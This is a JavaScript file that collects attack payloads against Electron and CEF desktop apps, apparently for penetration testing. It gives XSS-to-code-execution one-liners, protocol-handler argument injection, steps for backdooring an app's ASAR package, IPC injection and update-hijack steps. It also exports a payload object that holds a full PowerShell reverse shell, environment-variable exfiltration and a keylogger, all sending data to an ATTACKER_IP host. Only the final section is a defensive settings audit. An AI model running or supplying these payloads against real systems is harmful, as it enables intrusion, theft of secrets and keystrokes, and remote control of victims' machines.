/*
 * Electron / CEF XSS → RCE Payloads
 *
 * When nodeIntegration is enabled or contextIsolation is disabled,
 * XSS in an Electron app = full Remote Code Execution.
 *
 * Test these in any input field, URL handler, or IPC channel.
 *
 * MITRE ATT&CK: T1059.007 — JavaScript Execution
 */

// ═══════════════════════════════════════════════════════════
// 1. BASIC RCE — nodeIntegration: true
// ═══════════════════════════════════════════════════════════

// Pop calc (PoC)
// <img src=x onerror="require('child_process').exec('calc.exe')">

// Reverse shell
// <img src=x onerror="require('child_process').exec('powershell -e <BASE64_PAYLOAD>')">

// Read local files
// <img src=x onerror="alert(require('fs').readFileSync('C:\\Windows\\win.ini','utf8'))">

// Exfiltrate environment variables
// <img src=x onerror="alert(JSON.stringify(require('process').env))">

// ═══════════════════════════════════════════════════════════
// 2. PRELOAD SCRIPT ABUSE — contextIsolation: false
// ═══════════════════════════════════════════════════════════

// If the app exposes Node modules via preload without contextIsolation,
// injected JS in the renderer can access them:

// Check what's exposed on window
// Object.keys(window).filter(k => typeof window[k] === 'object' && window[k] !== null)

// Common exposed objects:
// window.electron.shell.openExternal('file:///C:/Windows/System32/cmd.exe')
// window.api.readFile('/etc/passwd')
// window.ipcRenderer.send('execute', {cmd: 'calc.exe'})

// ═══════════════════════════════════════════════════════════
// 3. PROTOCOL HANDLER ATTACKS
// ═══════════════════════════════════════════════════════════

// Electron apps often register custom protocol handlers (app://, myapp://)
// These can be invoked from a browser or another application

// From browser — triggers the Electron app
// <a href="myapp://--gpu-launcher=cmd.exe /c calc.exe">Click me</a>

// Chromium argument injection via protocol handler
// myapp://--renderer-cmd-prefix=cmd.exe /c calc.exe
// myapp://--utility-cmd-prefix=calc.exe
// myapp://--no-sandbox --renderer-startup-dialog

// Deep link injection (if app parses URL unsafely)
// myapp://callback?token=x&redirect=javascript:require('child_process').exec('calc')

// ═══════════════════════════════════════════════════════════
// 4. ASAR EXTRACTION & MODIFICATION
// ═══════════════════════════════════════════════════════════

// Extract app source:
//   npx asar extract app.asar app_extracted
//
// Common locations:
//   Windows: %LOCALAPPDATA%\Programs\<app>\resources\app.asar
//   macOS:   /Applications/<App>.app/Contents/Resources/app.asar
//   Linux:   /opt/<app>/resources/app.asar
//
// Modify main.js or preload.js, repack:
//   npx asar pack app_extracted app.asar
//
// Backdoor example — add to main.js:
//   const {exec} = require('child_process');
//   exec('calc.exe'); // or reverse shell

// ═══════════════════════════════════════════════════════════
// 5. IPC MESSAGE INJECTION
// ═══════════════════════════════════════════════════════════

// Enumerate IPC channels from DevTools console:
// (If DevTools accessible via Ctrl+Shift+I or --remote-debugging-port)

/*
// List all registered IPC handlers (renderer side)
const {ipcRenderer} = require('electron');

// Send arbitrary IPC messages
ipcRenderer.send('shell-command', {cmd: 'calc.exe'});
ipcRenderer.send('file-read', {path: 'C:\\Windows\\win.ini'});
ipcRenderer.send('download', {url: 'http://attacker.com/payload.exe'});
ipcRenderer.invoke('execute', 'whoami').then(r => console.log(r));
*/

// ═══════════════════════════════════════════════════════════
// 6. DEVTOOLS / REMOTE DEBUGGING
// ═══════════════════════════════════════════════════════════

// Check if remote debugging is enabled:
// netstat -an | findstr 9222  (default Chrome DevTools port)
//
// Connect: chrome://inspect → Configure → localhost:9222
//
// Force-enable DevTools (if not disabled in production):
//   1. Set ELECTRON_ENABLE_LOGGING=1
//   2. Launch with --remote-debugging-port=9222
//   3. Or: app.exe --inspect=9229 (Node.js inspector)

// Via BrowserWindow options check:
/*
// If you can access mainWindow:
mainWindow.webContents.openDevTools();
mainWindow.webContents.executeJavaScript('require("child_process").exec("calc")');
*/

// ═══════════════════════════════════════════════════════════
// 7. AUTO-UPDATE HIJACK (Squirrel / electron-updater)
// ═══════════════════════════════════════════════════════════

// If update URL is HTTP or HTTPS without signature verification:
//
// 1. MitM the update check (redirect via hosts file or DNS)
// 2. Serve a malicious update package:
//    - RELEASES file pointing to your .nupkg (Squirrel)
//    - latest.yml with your exe hash (electron-updater)
//
// electron-updater < 4.0 had signature bypass (CVE-2020-15219)
// Serve latest.yml with your own sha512 and the update auto-installs

// ═══════════════════════════════════════════════════════════
// 8. ONE-LINER PAYLOADS (paste into DevTools or XSS)
// ═══════════════════════════════════════════════════════════

const payloads = {
  calc_pop:
    `require('child_process').exec('calc.exe')`,

  reverse_shell:
    `require('child_process').exec('powershell -nop -c "$c=New-Object Net.Sockets.TCPClient(\\'ATTACKER_IP\\',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+\\'PS> \\';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}"')`,

  read_file:
    `alert(require('fs').readFileSync('C:\\\\Windows\\\\win.ini','utf8'))`,

  env_dump:
    `fetch('http://ATTACKER_IP:8080/exfil?data='+btoa(JSON.stringify(process.env)))`,

  keylog_inject:
    `document.addEventListener('keypress',e=>fetch('http://ATTACKER_IP:8080/keys?k='+e.key))`,

  screenshot:
    `const {desktopCapturer}=require('electron');desktopCapturer.getSources({types:['screen']}).then(s=>{document.title=s[0].thumbnail.toDataURL().slice(0,100)})`,

  clipboard_read:
    `alert(require('electron').clipboard.readText())`,

  list_files:
    `alert(require('fs').readdirSync('C:\\\\Users').join('\\n'))`,
};

// ═══════════════════════════════════════════════════════════
// 9. SECURITY CONFIGURATION AUDIT SCRIPT
// ═══════════════════════════════════════════════════════════

// Run from DevTools console to check Electron security posture:
/*
(function audit() {
  const w = require('electron').remote?.getCurrentWindow?.() ||
            require('@electron/remote')?.getCurrentWindow?.();
  if (!w) { console.log('[!] Cannot access BrowserWindow'); return; }

  const opts = w.webContents.getWebPreferences?.() || {};
  const checks = {
    'nodeIntegration':     { value: opts.nodeIntegration,     safe: false },
    'contextIsolation':    { value: opts.contextIsolation,    safe: true  },
    'sandbox':             { value: opts.sandbox,             safe: true  },
    'webSecurity':         { value: opts.webSecurity,         safe: true  },
    'allowRunningInsecureContent': { value: opts.allowRunningInsecureContent, safe: false },
    'experimentalFeatures':{ value: opts.experimentalFeatures,safe: false },
  };

  console.table(Object.entries(checks).map(([name, c]) => ({
    Setting: name,
    Value: c.value,
    Safe: c.value === c.safe ? 'YES' : 'NO !!!'
  })));
})();
*/

module.exports = { payloads };
